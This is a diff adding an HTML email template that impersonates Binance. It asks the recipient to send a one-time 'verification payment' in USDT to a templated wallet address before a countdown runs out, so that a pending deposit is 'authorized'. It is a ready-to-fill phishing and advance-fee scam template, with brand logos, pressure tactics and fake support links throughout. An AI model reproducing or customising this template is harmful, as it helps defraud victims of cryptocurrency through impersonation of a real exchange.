@@ -1,0 +1,299 @@
+<!-- email-templates/deposit-authorization.hbs -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Binance Deposit Authorization</title>
+  <style>
+    body {
+      background: #0c162d;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 0;
+      margin: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      background: #1e293b;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+      border: 1px solid #2d3a4e;
+    }
+    .header {
+      background: linear-gradient(90deg, #f0b90b 0%, #f8d12f 100%);
+      padding: 25px;
+      text-align: center;
+    }
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 12px;
+    }
+    .binance-logo {
+      font-size: 28px;
+      font-weight: 800;
+      color: #1e293b;
+      letter-spacing: 1px;
+    }
+    .usdt-badge {
+      background: #26a17b;
+      color: #fff;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+    .title {
+      color: #1e293b;
+      font-size: 22px;
+      font-weight: 700;
+      margin-top: 15px;
+    }
+    .status-bar {
+      background: #2d3a4e;
+      padding: 14px 20px;
+      display: flex;
+      justify-content: space-between;
+      border-top: 1px solid #3c4b63;
+      border-bottom: 1px solid #3c4b63;
+      font-size: 14px;
+    }
+    .status-pending {
+      color: #f0b90b;
+      font-weight: 600;
+    }
+    .content {
+      padding: 25px 30px;
+    }
+    .card {
+      background: #2d3a4e;
+      border-radius: 12px;
+      padding: 20px;
+      border: 1px solid #3c4b63;
+      margin-bottom: 25px;
+    }
+    .card-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #f0b90b;
+      margin-bottom: 10px;
+    }
+    .amount {
+      font-size: 38px;
+      color: #f0b90b;
+      font-weight: bold;
+      text-align: center;
+      margin: 20px 0;
+    }
+    .info-box {
+      background: #3c4b63;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 20px 0;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #4a5b78;
+    }
+    .info-row:last-child {
+      border-bottom: none;
+    }
+    .label {
+      color: #a0aec0;
+    }
+    .value {
+      font-weight: bold;
+      color: #fff;
+      max-width: 65%;
+      word-break: break-word;
+      text-align: right;
+    }
+    .wallet-title {
+      color: #a0aec0;
+      font-weight: 500;
+      margin: 20px 0 8px;
+    }
+    .wallet-address {
+      background: #2d3a4e;
+      border: 1px solid #3c4b63;
+      border-radius: 8px;
+      padding: 14px;
+      font-family: monospace;
+      color: #fff;
+      word-break: break-word;
+    }
+    .timer {
+      background: rgba(240, 185, 11, 0.1);
+      border: 1px solid rgba(240, 185, 11, 0.3);
+      border-radius: 8px;
+      text-align: center;
+      padding: 12px;
+      margin-top: 20px;
+      font-size: 16px;
+    }
+    .time-left {
+      color: #f0b90b;
+      font-size: 22px;
+      margin-top: 6px;
+      font-weight: bold;
+    }
+    .steps {
+      margin-top: 30px;
+    }
+    .step {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .step-number {
+      background: #f0b90b;
+      color: #1e293b;
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+    .step-content {
+      color: #e0e0e0;
+    }
+    .step-title {
+      color: #f0b90b;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+    .login-reminder {
+      text-align: center;
+      background: rgba(59, 130, 246, 0.1);
+      padding: 15px;
+      border-radius: 8px;
+      margin-top: 30px;
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      font-size: 14px;
+    }
+    .footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 13px;
+      color: #a0aec0;
+      border-top: 1px solid #2d3a4e;
+    }
+    .footer-links {
+      margin-top: 12px;
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+    }
+    .footer-links a {
+      color: #a0aec0;
+      text-decoration: none;
+    }
+    @media (max-width: 480px) {
+      .content {
+        padding: 20px;
+      }
+      .amount {
+        font-size: 32px;
+      }
+      .wallet-address {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo-container">
+        <div class="binance-logo">BINANCE</div>
+        <div class="usdt-badge">USDT</div>
+      </div>
+      <div class="title">Deposit Authorization Required</div>
+    </div>
+
+    <div class="status-bar">
+      <span class="status-pending">Payment Pending</span>
+      <span>Created: {{date}}</span>
+    </div>
+
+    <div class="content">
+      <div class="card">
+        <div class="card-title">One-Time Authorization</div>
+        <p>To complete your deposit securely, send a verification payment to confirm account ownership.</p>
+        <div class="amount">{{amount}} USDT</div>
+
+        <div class="info-box">
+          <div class="info-row">
+            <span class="label">Network:</span>
+            <span class="value">{{network}}</span>
+          </div>
+          <div class="info-row">
+            <span class="label">Fee:</span>
+            <span class="value">{{fee}} USDT</span>
+          </div>
+          <div class="info-row">
+            <span class="label">Total to Receive:</span>
+            <span class="value">{{totalToReceive}} USDT</span>
+          </div>
+        </div>
+
+        <div class="wallet-title">Send Payment To:</div>
+        <div class="wallet-address">{{walletAddress}}</div>
+
+        <div class="timer">
+          Complete payment within:
+          <div class="time-left">{{timeLeft}}</div>
+        </div>
+      </div>
+
+      <div class="steps">
+        <div class="step">
+          <div class="step-number">1</div>
+          <div class="step-content">
+            <div class="step-title">Log in to Binance</div>
+            <p>Use the web or app version to begin the payment process.</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-number">2</div>
+          <div class="step-content">
+            <div class="step-title">Send Payment</div>
+            <p>Send exactly <strong>{{amount}} USDT</strong> to the wallet address using <strong>{{network}}</strong>.</p>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-number">3</div>
+          <div class="step-content">
+            <div class="step-title">Complete Authorization</div>
+            <p>Once confirmed, your deposit will be processed automatically within a few minutes.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="login-reminder">
+        <strong>Reminder:</strong> Make sure you are logged in to your Binance account when sending the payment.
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>This is an automated message. Do not reply.</p>
+      <p>Need help? Visit our Support Center.</p>
+      <div class="footer-links">
+        <a href="#">Binance.com</a>
+        <a href="#">Support</a>
+        <a href="#">Security Tips</a>
+      </div>
+      <p style="margin-top: 15px;">© 2025 Binance. All rights reserved.</p>
+    </div>
+  </div>
+</body>
+</html>
